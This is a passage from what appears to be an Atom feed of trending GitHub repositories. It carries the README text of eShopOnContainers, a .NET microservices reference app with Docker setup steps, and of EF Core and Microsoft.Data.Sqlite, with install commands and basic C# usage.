Status&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/dotnet-architecture/eShopOnContainers/actions?query=workflow%3Awebstatus&#34;&gt;&lt;img src=&#34;https://github.com/dotnet-architecture/eShopOnContainers/workflows/webstatus/badge.svg?branch=dev&#34; alt=&#34;Web Status&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Shopping Aggregator (Web)&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/dotnet-architecture/eShopOnContainers/actions?query=workflow%3Awebshoppingagg&#34;&gt;&lt;img src=&#34;https://github.com/dotnet-architecture/eShopOnContainers/workflows/webshoppingagg/badge.svg?sanitize=true&#34; alt=&#34;Web Shopping Aggregator&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Basket API&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/dotnet-architecture/eShopOnContainers/actions?query=workflow%3Abasket-api&#34;&gt;&lt;img src=&#34;https://github.com/dotnet-architecture/eShopOnContainers/workflows/basket-api/badge.svg?branch=dev&#34; alt=&#34;Basket API&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Shopping Aggregator (Mobile)&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/dotnet-architecture/eShopOnContainers/actions?query=workflow%3Amobileshoppingagg&#34;&gt;&lt;img src=&#34;https://github.com/dotnet-architecture/eShopOnContainers/workflows/mobileshoppingagg/badge.svg?branch=dev&#34; alt=&#34;Mobile Shopping Aggregator&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Catalog API&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/dotnet-architecture/eShopOnContainers/actions?query=workflow%3Acatalog-api&#34;&gt;&lt;img src=&#34;https://github.com/dotnet-architecture/eShopOnContainers/workflows/catalog-api/badge.svg?sanitize=true&#34; alt=&#34;Catalog API&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Web Client (MVC)&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/dotnet-architecture/eShopOnContainers/actions?query=workflow%3Awebmvc&#34;&gt;&lt;img src=&#34;https://github.com/dotnet-architecture/eShopOnContainers/workflows/webmvc/badge.svg?branch=dev&#34; alt=&#34;WebMVC Client&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Identity API&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/dotnet-architecture/eShopOnContainers/actions?query=workflow%3Aidentity-api&#34;&gt;&lt;img src=&#34;https://github.com/dotnet-architecture/eShopOnContainers/workflows/identity-api/badge.svg?branch=dev&#34; alt=&#34;Identity API&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Web Client (SPA)&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/dotnet-architecture/eShopOnContainers/actions?query=workflow%3Awebspa&#34;&gt;&lt;img src=&#34;https://github.com/dotnet-architecture/eShopOnContainers/workflows/webspa/badge.svg?branch=dev&#34; alt=&#34;WebSPA Client&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Ordering API&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/dotnet-architecture/eShopOnContainers/actions?query=workflow%3Aordering-api&#34;&gt;&lt;img src=&#34;https://github.com/dotnet-architecture/eShopOnContainers/workflows/ordering-api/badge.svg?branch=dev&#34; alt=&#34;Ordering API&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Webhooks Client&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/dotnet-architecture/eShopOnContainers/actions?query=workflow%3Awebhooks-client&#34;&gt;&lt;img src=&#34;https://github.com/dotnet-architecture/eShopOnContainers/workflows/webhooks-client/badge.svg?sanitize=true&#34; alt=&#34;Webhooks demo client&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Payment API&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/dotnet-architecture/eShopOnContainers/actions?query=workflow%3Apayment-api&#34;&gt;&lt;img src=&#34;https://github.com/dotnet-architecture/eShopOnContainers/workflows/payment-api/badge.svg?branch=dev&#34; alt=&#34;Payment API&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Ordering SignalR&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/dotnet-architecture/eShopOnContainers/actions?query=workflow%3Aordering-signalrhub&#34;&gt;&lt;img src=&#34;https://github.com/dotnet-architecture/eShopOnContainers/workflows/ordering-signalrhub/badge.svg?sanitize=true&#34; alt=&#34;Ordering SignalR&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;&lt;em&gt;&lt;strong&gt;Dev&lt;/strong&gt; branch contains the latest &lt;strong&gt;beta&lt;/strong&gt; code and their images are tagged with &lt;code&gt;:linux-dev&lt;/code&gt; in our &lt;a href=&#34;https://hub.docker.com/u/eshop&#34;&gt;Docker Hub&lt;/a&gt;&lt;/em&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Getting Started&lt;/h2&gt; &#xA;&lt;p&gt;Make sure you have &lt;a href=&#34;https://docs.docker.com/docker-for-windows/install/&#34;&gt;installed&lt;/a&gt; and &lt;a href=&#34;https://github.com/dotnet-architecture/eShopOnContainers/wiki/Windows-setup#configure-docker&#34;&gt;configured&lt;/a&gt; docker in your environment. After that, you can run the below commands from the &lt;strong&gt;/src/&lt;/strong&gt; directory and get started with the &lt;code&gt;eShopOnContainers&lt;/code&gt; immediately.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;docker-compose build&#xA;docker-compose up&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You should be able to browse different components of the application by using the below URLs :&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Web Status : http://host.docker.internal:5107/&#xA;Web MVC :  http://host.docker.internal:5100/&#xA;Web SPA :  http://host.docker.internal:5104/&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Note: If you are running this application in macOS then use &lt;code&gt;docker.for.mac.localhost&lt;/code&gt; as DNS name in &lt;code&gt;.env&lt;/code&gt; file and the above URLs instead of &lt;code&gt;host.docker.internal&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;Below are the other avenues to setup &lt;em&gt;eShopOnContainers&lt;/em&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Basic scenario&lt;/h3&gt; &#xA;&lt;p&gt;The basic scenario can be run locally using docker-compose, and also deployed to a local Kubernetes cluster. Refer to these Wiki pages to Get Started:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dotnet-architecture/eShopOnContainers/wiki/Windows-setup#optional---use-visual-studio&#34;&gt;Visual Studio (F5 experience)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dotnet-architecture/eShopOnContainers/wiki/Windows-setup&#34;&gt;Docker compose on windows&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dotnet-architecture/eShopOnContainers/wiki/Mac-setup&#34;&gt;Docker compose on macOS&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dotnet-architecture/eShopOnContainers/wiki/Deploy-to-Local-Kubernetes&#34;&gt;Local Kubernetes&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Advanced scenario&lt;/h3&gt; &#xA;&lt;p&gt;The Advanced scenario can be run only in a Kubernetes cluster. Currently, this scenario is the same as a basic scenario with the following differences:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dotnet-architecture/eShopOnContainers/wiki/Deploy-to-Azure-Kubernetes-Service-(AKS)&#34;&gt;Deploy to AKS with a Service Mesh for resiliency&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;In the future, more features will be implemented in the advanced scenario.&lt;/p&gt; &#xA;&lt;h2&gt;IMPORTANT NOTES!&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;You can use either the latest version of Visual Studio or simply Docker CLI and .NET CLI for Windows, Mac, and Linux&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note for Pull Requests (PRs)&lt;/strong&gt;: We accept pull requests from the community. When doing it, please do it onto the &lt;strong&gt;DEV branch&lt;/strong&gt; which is the consolidated work-in-progress branch. Do not request it onto &lt;strong&gt;main&lt;/strong&gt; branch.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;NEWS / ANNOUNCEMENTS&lt;/strong&gt; Do you want to be up-to-date on .NET Architecture guidance and reference apps like eShopOnContainers? --&amp;gt; Subscribe by &#34;WATCHING&#34; this new GitHub repo: &lt;a href=&#34;https://github.com/dotnet-architecture/News&#34;&gt;https://github.com/dotnet-architecture/News&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Updated for .NET 6&lt;/h2&gt; &#xA;&lt;p&gt;eShopOnContainers is updated to .NET 6 &#34;wave&#34; of technologies. Not just compilation but also new recommended code in EF Core, ASP.NET Core, and other new related versions with several significant changes.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;See more details in the &lt;a href=&#34;https://github.com/dotnet-architecture/eShopOnContainers/wiki/Release-notes&#34;&gt;Release notes&lt;/a&gt; wiki page&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&lt;strong&gt;PLEASE&lt;/strong&gt; Read our &lt;a href=&#34;https://raw.githubusercontent.com/dotnet-architecture/eShopOnContainers/dev/branch-guide.md&#34;&gt;branch guide&lt;/a&gt; to know about our branching policy&lt;/p&gt; &#xA; &lt;h3&gt;DISCLAIMER&lt;/h3&gt; &#xA; &lt;p&gt;&lt;strong&gt;IMPORTANT:&lt;/strong&gt; The current state of this sample application is &lt;strong&gt;BETA&lt;/strong&gt;, because we are constantly evolving towards newly released technologies. Therefore, many areas could be improved and change significantly while refactoring the current code and implementing new features. Feedback with improvements and pull requests from the community will be highly appreciated and accepted.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h3&gt;Architecture overview&lt;/h3&gt; &#xA;&lt;p&gt;This reference application is cross-platform at the server and client-side, thanks to .NET 6 services capable of running on Linux or Windows containers depending on your Docker host, and to Xamarin for mobile apps running on Android, iOS, or Windows/UWP plus any browser for the client web apps. The architecture proposes a microservice oriented architecture implementation with multiple autonomous microservices (each one owning its own data/db) and implementing different approaches within each microservice (simple CRUD vs. DDD/CQRS patterns) using HTTP as the communication protocol between the client apps and the microservices and supports asynchronous communication for data updates propagation across multiple services based on Integration Events and an Event Bus (a light message broker, to choose between RabbitMQ or Azure Service Bus, underneath) plus other features defined at the &lt;a href=&#34;https://github.com/dotnet-architecture/eShopOnContainers/wiki/Roadmap&#34;&gt;roadmap&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/dotnet-architecture/eShopOnContainers/dev/img/eshop_logo.png&#34; alt=&#34;&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/dotnet-architecture/eShopOnContainers/dev/img/eShopOnContainers-architecture.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Related documentation and guidance&lt;/h2&gt; &#xA;&lt;p&gt;You can find the related reference &lt;strong&gt;Guide/eBook&lt;/strong&gt; focusing on &lt;strong&gt;architecting and developing containerized and microservice-based .NET Applications&lt;/strong&gt; (download link available below) which explains in detail how to develop this kind of architectural style (microservices, Docker containers, Domain-Driven Design for certain microservices) plus other simpler architectural styles, like monolithic apps that can also live as Docker containers.&lt;/p&gt; &#xA;&lt;p&gt;There are also additional eBooks focusing on Containers/Docker lifecycle (DevOps, CI/CD, etc.) with Microsoft Tools, already published plus an additional eBook focusing on Enterprise Apps Patterns with Xamarin.Forms. You can download them and start reviewing these Guides/eBooks here:&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Architecting &amp;amp; Developing&lt;/th&gt; &#xA;   &lt;th&gt;Containers Lifecycle &amp;amp; CI/CD&lt;/th&gt; &#xA;   &lt;th&gt;App patterns with Xamarin.Forms&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://aka.ms/microservicesebook&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/dotnet-architecture/eShopOnContainers/dev/img/architecture-book-cover-large-we.png&#34; alt=&#34;&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://aka.ms/dockerlifecycleebook&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/dotnet-architecture/eShopOnContainers/dev/img/devops-book-cover-large-we.png&#34; alt=&#34;&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://aka.ms/xamarinpatternsebook&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/dotnet-architecture/eShopOnContainers/dev/img/xamarin-enterprise-patterns-ebook-cover-large-we.png&#34; alt=&#34;&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;sup&gt; &lt;a href=&#34;https://aka.ms/microservicesebook&#34;&gt;&lt;strong&gt;Download PDF&lt;/strong&gt;&lt;/a&gt; &lt;/sup&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;sup&gt; &lt;a href=&#34;https://aka.ms/dockerlifecycleebook&#34;&gt;&lt;strong&gt;Download PDF&lt;/strong&gt; &lt;/a&gt; &lt;/sup&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;sup&gt; &lt;a href=&#34;https://aka.ms/xamarinpatternsebook&#34;&gt;&lt;strong&gt;Download PDF&lt;/strong&gt; &lt;/a&gt; &lt;/sup&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;For more free e-Books check out &lt;a href=&#34;https://dot.net/architecture&#34;&gt;.NET Architecture center&lt;/a&gt;. If you have an e-book feedback, let us know by creating a new issue here: &lt;a href=&#34;https://github.com/dotnet-architecture/ebooks/issues&#34;&gt;https://github.com/dotnet-architecture/ebooks/issues&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Are you new to &lt;strong&gt;microservices&lt;/strong&gt; and &lt;strong&gt;cloud-native development&lt;/strong&gt;?&lt;/h2&gt; &#xA;&lt;p&gt;Take a look at the free course &lt;a href=&#34;https://docs.microsoft.com/en-us/learn/modules/microservices-aspnet-core/&#34;&gt;Create and deploy a cloud-native ASP.NET Core microservice&lt;/a&gt; on MS Learn. This module explains microservices concepts, cloud-native technologies, and reduces the friction in getting started with &lt;code&gt;eShopOnContainers&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Read further&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dotnet-architecture/eShopOnContainers/wiki/Explore-the-application&#34;&gt;Explore the application&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dotnet-architecture/eShopOnContainers/wiki/Explore-the-code&#34;&gt;Explore the code&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Sending feedback and pull requests&lt;/h2&gt; &#xA;&lt;p&gt;Read the planned &lt;a href=&#34;https://github.com/dotnet-architecture/eShopOnContainers/wiki/Roadmap&#34;&gt;Roadmap&lt;/a&gt; within the Wiki for further info about possible new implementations and provide feedback at the &lt;a href=&#34;https://github.com/dotnet/eShopOnContainers/issues&#34;&gt;ISSUES section&lt;/a&gt; if you&#39;d like to see any specific scenario implemented or improved. Also, feel free to discuss on any current issue.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>dotnet/efcore</title>
    <updated>2022-05-29T01:36:31Z</updated>
    <id>tag:github.com,2022-05-29:/dotnet/efcore</id>
    <link href="https://github.com/dotnet/efcore" rel="alternate"></link>
    <summary type="html">&lt;p&gt;EF Core is a modern object-database mapper for .NET. It supports LINQ queries, change tracking, updates, and schema migrations.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Repository&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://dev.azure.com/dnceng/public/_build?definitionId=51&#34;&gt;&lt;img src=&#34;https://img.shields.io/azure-devops/build/dnceng/public/51/main&#34; alt=&#34;build status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://dev.azure.com/dnceng/public/_build?definitionId=51&#34;&gt;&lt;img src=&#34;https://img.shields.io/azure-devops/tests/dnceng/public/51/main&#34; alt=&#34;test results&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;This repository is home to the following &lt;a href=&#34;https://dotnetfoundation.org/&#34;&gt;.NET Foundation&lt;/a&gt; projects. These projects are maintained by &lt;a href=&#34;https://github.com/microsoft&#34;&gt;Microsoft&lt;/a&gt; and licensed under the &lt;a href=&#34;https://raw.githubusercontent.com/dotnet/efcore/main/LICENSE.txt&#34;&gt;MIT License&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dotnet/efcore/main/#entity-framework-core&#34;&gt;Entity Framework Core&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dotnet/efcore/main/#microsoftdatasqlite&#34;&gt;Microsoft.Data.Sqlite&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Entity Framework Core&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.nuget.org/packages/Microsoft.EntityFrameworkCore&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/v/Microsoft.EntityFrameworkCore&#34; alt=&#34;latest version&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.nuget.org/packages/Microsoft.EntityFrameworkCore/absoluteLatest&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/vpre/Microsoft.EntityFrameworkCore&#34; alt=&#34;preview version&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.nuget.org/packages/Microsoft.EntityFrameworkCore&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/dt/Microsoft.EntityFrameworkCore&#34; alt=&#34;downloads&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;EF Core is a modern object-database mapper for .NET. It supports LINQ queries, change tracking, updates, and schema migrations. EF Core works with SQL Server, Azure SQL Database, SQLite, Azure Cosmos DB, MySQL, PostgreSQL, and other databases through a provider plugin API.&lt;/p&gt; &#xA;&lt;h3&gt;Installation&lt;/h3&gt; &#xA;&lt;p&gt;EF Core is available on &lt;a href=&#34;https://www.nuget.org/packages/Microsoft.EntityFrameworkCore&#34;&gt;NuGet&lt;/a&gt;. Install the provider package corresponding to your target database. See the &lt;a href=&#34;https://docs.microsoft.com/ef/core/providers/&#34;&gt;list of providers&lt;/a&gt; in the docs for additional databases.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;dotnet add package Microsoft.EntityFrameworkCore.SqlServer&#xA;dotnet add package Microsoft.EntityFrameworkCore.Sqlite&#xA;dotnet add package Microsoft.EntityFrameworkCore.Cosmos&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Use the &lt;code&gt;--version&lt;/code&gt; option to specify a &lt;a href=&#34;https://www.nuget.org/packages/Microsoft.EntityFrameworkCore/absoluteLatest&#34;&gt;preview version&lt;/a&gt; to install.&lt;/p&gt; &#xA;&lt;h3&gt;Daily builds&lt;/h3&gt; &#xA;&lt;p&gt;We recommend using the &lt;a href=&#34;https://raw.githubusercontent.com/dotnet/efcore/main/docs/DailyBuilds.md&#34;&gt;daily builds&lt;/a&gt; to get the latest code and provide feedback on EF Core. These builds contain latest features and bug fixes; previews and official releases lag significantly behind.&lt;/p&gt; &#xA;&lt;h3&gt;Basic usage&lt;/h3&gt; &#xA;&lt;p&gt;The following code demonstrates basic usage of EF Core. For a full tutorial configuring the &lt;code&gt;DbContext&lt;/code&gt;, defining the model, and creating the database, see &lt;a href=&#34;https://docs.microsoft.com/ef/core/get-started/&#34;&gt;getting started&lt;/a&gt; in the docs.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cs&#34;&gt;using (var db = new BloggingContext())&#xA;{&#xA;    // Inserting data into the database&#xA;    db.Add(new Blog { Url = &#34;http://blogs.msdn.com/adonet&#34; });&#xA;    db.SaveChanges();&#xA;&#xA;    // Querying&#xA;    var blog = db.Blogs&#xA;        .OrderBy(b =&amp;gt; b.BlogId)&#xA;        .First();&#xA;&#xA;    // Updating&#xA;    blog.Url = &#34;https://devblogs.microsoft.com/dotnet&#34;;&#xA;    blog.Posts.Add(&#xA;        new Post&#xA;        {&#xA;            Title = &#34;Hello World&#34;,&#xA;            Content = &#34;I wrote an app using EF Core!&#34;&#xA;        });&#xA;    db.SaveChanges();&#xA;&#xA;    // Deleting&#xA;    db.Remove(blog);&#xA;    db.SaveChanges();&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Build from source&lt;/h3&gt; &#xA;&lt;p&gt;Most people use EF Core by installing pre-build NuGet packages, as shown above. Alternately, &lt;a href=&#34;https://raw.githubusercontent.com/dotnet/efcore/main/docs/getting-and-building-the-code.md&#34;&gt;the code can be built and packages can be created directly on your development machine&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Contributing&lt;/h3&gt; &#xA;&lt;p&gt;We welcome community pull requests for bug fixes, enhancements, and documentation. See &lt;a href=&#34;https://raw.githubusercontent.com/dotnet/efcore/main/.github/CONTRIBUTING.md&#34;&gt;How to contribute&lt;/a&gt; for more information.&lt;/p&gt; &#xA;&lt;h3&gt;Getting support&lt;/h3&gt; &#xA;&lt;p&gt;If you have a specific question about using these projects, we encourage you to &lt;a href=&#34;https://stackoverflow.com/questions/tagged/entity-framework-core*?tab=Votes&#34;&gt;ask it on Stack Overflow&lt;/a&gt;. If you encounter a bug or would like to request a feature, &lt;a href=&#34;https://github.com/dotnet/efcore/issues/new/choose&#34;&gt;submit an issue&lt;/a&gt;. For more details, see &lt;a href=&#34;https://raw.githubusercontent.com/dotnet/efcore/main/.github/SUPPORT.md&#34;&gt;getting support&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Microsoft.Data.Sqlite&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.nuget.org/packages/Microsoft.Data.Sqlite&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/v/Microsoft.Data.Sqlite&#34; alt=&#34;latest version&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.nuget.org/packages/Microsoft.Data.Sqlite/absoluteLatest&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/vpre/Microsoft.Data.Sqlite&#34; alt=&#34;preview version&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.nuget.org/packages/Microsoft.Data.Sqlite&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/dt/Microsoft.Data.Sqlite.Core&#34; alt=&#34;downloads&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Microsoft.Data.Sqlite is a lightweight ADO.NET provider for SQLite. The EF Core provider for SQLite is built on top of this library. However, it can also be used independently or with other data access libraries.&lt;/p&gt; &#xA;&lt;h3&gt;Installation&lt;/h3&gt; &#xA;&lt;p&gt;The latest stable version is available on &lt;a href=&#34;https://www.nuget.org/packages/Microsoft.Data.Sqlite&#34;&gt;NuGet&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;dotnet add package Microsoft.Data.Sqlite&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Use the &lt;code&gt;--version&lt;/code&gt; option to specify a &lt;a href=&#34;https://www.nuget.org/packages/Microsoft.Data.Sqlite/absoluteLatest&#34;&gt;preview version&lt;/a&gt; to install.&lt;/p&gt; &#xA;&lt;h3&gt;Daily builds&lt;/h3&gt; &#xA;&lt;p&gt;We recommend using the &lt;a href=&#34;https://raw.githubusercontent.com/dotnet/efcore/main/docs/DailyBuilds.md&#34;&gt;daily builds&lt;/a&gt; to get the latest code and provide feedback on Microsoft.Data.Sqlite. These builds contain latest features and bug fixes; previews and official releases lag significantly behind.&lt;/p&gt; &#xA;&lt;h3&gt;Basic usage&lt;/h3&gt; &#xA;&lt;p&gt;This library implements the common &lt;a href=&#34;https://docs.microsoft.com/dotnet/framework/data/adonet/&#34;&gt;ADO.NET&lt;/a&gt; abstractions for connections, commands, data readers, and so on. For more information, see &lt;a href=&#34;https://docs.microsoft.com/dotnet/standard/data/sqlite/&#34;&gt;Microsoft.Data.Sqlite&lt;/a&gt; on Microsoft Docs.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cs&#34;&gt;using (var connection = new SqliteConnection(&#34;Data Source=Blogs.db&#34;))&#xA;{&#xA;    connection.Open();&#xA;&#xA;    var command = connection.CreateCommand();&#xA;    command.CommandText = &#34;SELECT Url FROM Blogs&#34;;&#xA;&#xA;    using (var reader = command.ExecuteReader())&#xA;    {&#xA;        while (reader.Read())&#xA;        {&#xA;            var url = reader.GetString(0);&#xA;        }&#xA;    }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Build from source&lt;/h3&gt; &#xA;&lt;p&gt;Most people use Microsoft.Data.Sqlite by installing pre-build NuGet packages, as shown above. Alternately, &lt;a href=&#34;https://raw.githubusercontent.com/dotnet/efcore/main/docs/getting-and-building-the-code.md&#34;&gt;the code can be built and packages can be created directly on your development machine&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Contributing&lt;/h3&gt; &#xA;&lt;p&gt;We welcome community pull requests for bug fixes, enhancements, and documentation. See &lt;a href=&#34;https://raw.githubusercontent.com/dotnet/efcore/main/.github/CONTRIBUTING.md&#34;&gt;How to contribute&lt;/a&gt; for more information.&lt;/p&gt; &#xA;&lt;h3&gt;Getting support&lt;/h3&gt; &#xA;&lt;p&gt;If you have a specific question about using these projects, we encourage you to &lt;a href=&#34;https://stackoverflow.com/questions/tagged/microsoft.data.sqlite&#34;&gt;ask it on Stack Overflow&lt;/a&gt;. If you encounter a bug or would like to request a feature, &lt;a href=&#34;https://github.com/dotnet/efcore/issues/new/choose&#34;&gt;submit an issue&lt;/a&gt;. For more details, see &lt;a href=&#34;https://raw.githubusercontent.com/dotnet/efcore/main/.github/SUPPORT.md&#34;&gt;getting support&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;See also&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/ef/core/&#34;&gt;Documentation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/ef/core/what-is-new/roadmap&#34;&gt;Roadmap&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dotnet/efcore/issues/23884&#34;&gt;Weekly status updates&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/ef/core/what-is-new/release-planning&#34;&gt;Release planning process&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/ef/core/providers/writing-a-provider&#34;&gt;How to write an EF Core provider&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dotnet/efcore/main/docs/security.md&#34;&gt;Security&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dotnet/efcore/main/.github/CODE_OF_CONDUCT.md&#34;&gt;Code of conduct&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>Cysharp/UniTask</title>
    <updated>2022-05-29T01:36:31Z</updated>
    <id>tag:github.com,2022-05-29:/Cysharp/UniTask</id>
    <link href="https://github.com/Cysharp/UniTask" rel="alternate"></link>
